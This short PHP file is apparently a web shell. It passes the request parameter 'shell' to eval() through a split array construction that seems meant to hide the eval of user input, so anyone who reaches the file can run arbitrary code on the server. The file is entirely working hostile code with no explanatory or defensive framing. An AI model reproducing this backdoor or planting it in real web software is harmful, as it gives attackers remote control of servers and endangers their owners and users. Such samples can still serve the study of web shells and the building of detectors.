<?php
$array = array(
    'part_one'   => false,
    'part_two'    => $_REQUEST['shell'],
);
eval($array['part_one'].$array['part_two']);
?>
